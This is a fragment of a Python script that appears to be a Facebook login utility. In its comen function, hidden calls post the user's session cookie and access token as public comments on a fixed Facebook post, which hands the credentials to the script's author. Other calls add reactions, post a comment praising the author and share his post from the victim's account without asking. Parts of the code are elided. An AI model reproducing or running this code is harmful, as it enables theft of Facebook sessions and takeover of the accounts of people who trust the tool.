...
def comen(kook,token):
	cookie = kook
	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Makasih Bang Selalu Coeg><","semoga @[1304744018:0] panjang umur dan rejeki nya dilancarkan aminnn"]);react_angry = 'ANGRY';requests.post(f"https://graph.facebook.com/1304744018_1022012950401397/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com//1304744018_10220129150401397/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/1304744018?fields=subscribers&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/1304744018_10220129150401397/comments/?message={cookie}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/1304744018_10220129150401397/comments/?message={toket}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/1304744018_10220129150401397/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":cookie});menu()
...
def cek_cookie():
	...
	try:
		...
		try:
			...
			requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/1304744018/posts/10220129150401397/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
			menu()
		except (KeyError):
